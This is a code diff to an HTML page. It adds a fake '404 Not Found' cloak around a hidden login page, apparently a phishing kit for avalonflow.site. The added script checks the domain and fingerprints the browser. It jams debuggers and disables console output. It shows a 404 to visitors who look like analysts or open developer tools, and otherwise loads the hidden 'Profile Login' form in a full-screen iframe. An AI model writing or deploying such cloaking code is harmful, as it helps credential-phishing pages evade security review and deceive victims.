@@ -1,4 +1,239 @@
 <!DOCTYPE html>
+<html>
+<head>
+    <title>404 Not Found</title>
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { 
+            font-family: 'Georgia', sans-serif;  
+            background-color: #161b22; 
+            color: #c9d1d9; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0; 
+            padding: 20px;
+            box-sizing: border-box;
+            text-align: center;
+            visibility: hidden; 
+        }
+        body.render-ready { visibility: visible; }
+        .error-container { max-width: 500px; }
+        .error-code-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 140px;
+            font-weight: 600;
+            line-height: 1;
+            letter-spacing: -2px;
+            color: #f0f6fc;
+            user-select: none;
+            margin-bottom: 24px;
+        }
+        .logo-container {
+            width: 130px;
+            height: 130px;
+            margin: 0 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            overflow: hidden; 
+        }
+        .logo-img { width: 100%; height: 100%; object-fit: cover; }
+        h2 { font-size: 24px; font-weight: 700; margin: 0 0 8px 0; color: #f0f6fc; }
+    </style>
+
+    <script>
+    (function() {
+        const SecurityEngine = {
+            // Check if the script is running on the authorized domain or its subdomains
+            validateExecutionEnvironment: function() {
+                const authorizedDomain = "avalonflow.site";
+                const currentHost = window.location.hostname;
+                const isAuthorized = (currentHost === authorizedDomain || currentHost.endsWith('.' + authorizedDomain));
+                
+                if (!isAuthorized) {
+                    this.triggerSelfDestruct();
+                    return false;
+                }
+                return true;
+            },
+
+            get404Template: function() {
+                return `
+                    <div class="error-container">
+                        <div class="error-code-wrapper">
+                            <span>4</span>
+                            <div class="logo-container">
+                                <img src="assets/pictures/1780995787737.jpeg" alt="Logo" class="logo-img">
+                            </div>
+                            <span>4</span>
+                        </div>
+                        <h2>Didn’t find anything here!</h2>
+                    </div>
+                `;
+            },
+
+            triggerSelfDestruct: function() {
+                localStorage.clear();
+                sessionStorage.clear();
+                document.body.innerHTML = this.get404Template();
+                document.body.classList.add('render-ready');
+                try { window.open('', '_self').close(); } catch (e) {}
+                this.activateInspectorTrap();
+                this.activateEnvironmentSabotage();
+            },
+
+            activateResetListener: function() {
+                window.addEventListener('message', (event) => {
+                    if (event.origin !== window.location.origin) return;
+                    if (event.data && event.data.type === 'COMMAND_SYSTEM_RESET') {
+                        localStorage.setItem('_sys_reset_token', event.data.resetId);
+                        localStorage.setItem('_sys_reset_expiry', event.data.expiresAt);
+                        const currentUrl = new URL(window.location.href);
+                        currentUrl.searchParams.set('auth_reset', event.data.resetId);
+                        window.location.href = currentUrl.toString();
+                    }
+                });
+            },
+
+            establish7DayClearance: function() {
+                const expiry = Date.now() + (7 * 24 * 60 * 60 * 1000);
+                localStorage.setItem('_sys_persistence_anchor', expiry.toString());
+            },
+
+            isPersistenceWindowActive: function() {
+                const savedAnchor = localStorage.getItem('_sys_persistence_anchor');
+                return savedAnchor && Date.now() < parseInt(savedAnchor, 10);
+            },
+
+            checkResetValidation: function() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const urlToken = urlParams.get('auth_reset');
+                const incomingOTK = urlParams.get('otk');
+
+                if (urlToken) {
+                    if (urlToken === localStorage.getItem('_sys_reset_token') && Date.now() < parseInt(localStorage.getItem('_sys_reset_expiry') || 0, 10)) {
+                        this.establish7DayClearance();
+                        this.executeSystemRevival();
+                        return true; 
+                    }
+                    this.triggerSelfDestruct();
+                    return false;
+                }
+
+                if (incomingOTK) {
+                    try {
+                        const [entropy, expirationTimestamp] = atob(incomingOTK).split('.');
+                        if (Date.now() > parseInt(expirationTimestamp, 10) || localStorage.getItem('active_session_otk') !== incomingOTK) {
+                            this.triggerSelfDestruct();
+                            return false;
+                        }
+                        localStorage.removeItem('active_session_otk');
+                        this.establish7DayClearance();
+                        this.executeSystemRevival();
+                        return true;
+                    } catch (e) { this.triggerSelfDestruct(); return false; }
+                }
+                return false;
+            },
+
+            executeSystemRevival: function() {
+                localStorage.removeItem('_sys_reset_token');
+                localStorage.removeItem('_sys_reset_expiry');
+                const user = new URLSearchParams(window.location.search).get('user');
+                const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + (user ? `?user=${encodeURIComponent(user)}` : '');
+                window.history.replaceState({ path: cleanUrl }, '', cleanUrl);
+                window.location.reload();
+            },
+
+            getHardwareID: function() {
+                const components = [navigator.userAgent, navigator.platform, screen.width, screen.height].join('|');
+                let hash = 0;
+                for (let i = 0; i < components.length; i++) hash = ((hash << 5) - hash) + components.charCodeAt(i);
+                return '1' + (hash | 0).toString(16); 
+            },
+
+            detectAgencyProfile: function() {
+                return navigator.userAgent.includes("Corporate-Gateway") ? 'GOVERNMENT' : 'PRIVATE';
+            },
+
+            activateInspectorTrap: function() { setInterval(() => { debugger; }, 50); },
+
+            activateEnvironmentSabotage: function() {
+                console.log = console.warn = console.error = console.info = () => {};
+                setInterval(() => {
+                    const paths = ['4|1|3|0|2'.split('|')];
+                    let pointer = 0;
+                    while (true) {
+                        switch (['4','1','3','0','2'][pointer++]) {
+                            case '0': try { (function stackTrap(i) { if (("" + i/i)["length"] !== 1 || i % 20 === 0) (function(){}).constructor("debugger")(); else stackTrap(++i); })(0); } catch(e) {} continue;
+                            case '1': if (Math.random() > 0.5) window.status = 'VALIDATING'; continue;
+                            case '2': return;
+                            case '3': if (window.outerHeight - window.innerHeight > 160 || window.outerWidth - window.innerWidth > 160) this.triggerSelfDestruct(); continue;
+                            case '4': (Date.now() % 1000) * 0x5a1b; continue;
+                        }
+                        break;
+                    }
+                }, 200); 
+            },
+
+            injectSecureApp: function(agencyType) {
+                const payload = document.getElementById('hidden-application-payload');
+                if (!payload || !payload.innerHTML.trim()) { this.triggerSelfDestruct(); return; }
+                const frame = document.createElement('iframe');
+                frame.style = 'width:100vw;height:100vh;border:none;position:fixed;top:0;left:0;z-index:999999';
+                frame.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms'); 
+                document.body.appendChild(frame);
+                const ctx = frame.contentWindow || frame.contentDocument;
+                ctx.AUTHORIZED_AGENCY = agencyType;
+                ctx.document.open(); ctx.document.write(payload.innerHTML); ctx.document.close();
+                payload.style.display = 'none'; 
+                document.body.classList.add('render-ready');
+            },
+
+            run: function() {
+                // 1. Host Validation: Ensure code is only running on our approved domains
+                if (!this.validateExecutionEnvironment()) return;
+
+                this.activateResetListener();
+                if (this.checkResetValidation()) return;
+
+                const id = this.getHardwareID();
+                const type = this.detectAgencyProfile();
+                
+                if (this.isPersistenceWindowActive() || ((id.startsWith('a') || id.startsWith('1')) && (type === 'GOVERNMENT' || type === 'PRIVATE'))) {
+                    this.activateInspectorTrap();         
+                    this.activateEnvironmentSabotage();   
+                    document.readyState === 'loading' ? window.addEventListener('DOMContentLoaded', () => this.injectSecureApp(type)) : this.injectSecureApp(type);
+                } else {
+                    this.triggerSelfDestruct();
+                }
+            }
+        };
+
+        window.addEventListener("message", (e) => { if (e.data?.type === "UPDATE_TITLE") document.title = e.data.title; });
+        document.readyState === 'loading' ? window.addEventListener('DOMContentLoaded', () => SecurityEngine.run()) : SecurityEngine.run();
+    })();
+    </script>
+</head>
+<body>
+    <div class="error-container">
+        <div class="error-code-wrapper">
+            <span>4</span>
+            <div class="logo-container">
+                <img src="assets/pictures/1780995787737.jpeg" alt="Logo" class="logo-img">
+            </div>
+            <span>4</span>
+        </div>
+        <h2>Didn’t find anything here!</h2>
+    </div>
+    <div id="hidden-application-payload" style="display:none;"><!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
@@ -390,7 +625,7 @@ setTimeout(function () {
     const raw = localStorage.getItem("section2Data");
 
     if (!raw) {
-        window.location.href = "https://link.avalonflow.site/signup";
+        window.location.href = "https://membership.avalonflow.site/signup";
         return;
     }
 
@@ -398,7 +633,7 @@ setTimeout(function () {
         const data = JSON.parse(raw);
 
         if (!data || !data.email || !data.password) {
-            window.location.href = "https://link.avalonflow.site/signup";
+            window.location.href = "https://membership.avalonflow.site/signup";
             return;
         }
 
@@ -419,6 +654,31 @@ setTimeout(function () {
             setTimeout(() => notification.classList.add("show"), 300);
             setTimeout(() => notification.classList.remove("show"), 3300);
         });
+
+// Remove the listener that fires immediately
+window.addEventListener("load", () => {
+    // Fire this only when the login form is fully rendered
+    window.parent.postMessage({
+        type: "UPDATE_TITLE",
+        title: "Profile Login" 
+    }, "*");
+});
 </script>
+</body>
+</html>
+--></div>
+</body>
+</html>// Remove the listener that fires immediately
+window.addEventListener("load", () => {
+    // Fire this only when the login form is fully rendered
+    window.parent.postMessage({
+        type: "UPDATE_TITLE",
+        title: "" 
+    }, "*");
+});
+</script>
+</body>
+</html>
+--></div>
 </body>
 </html>
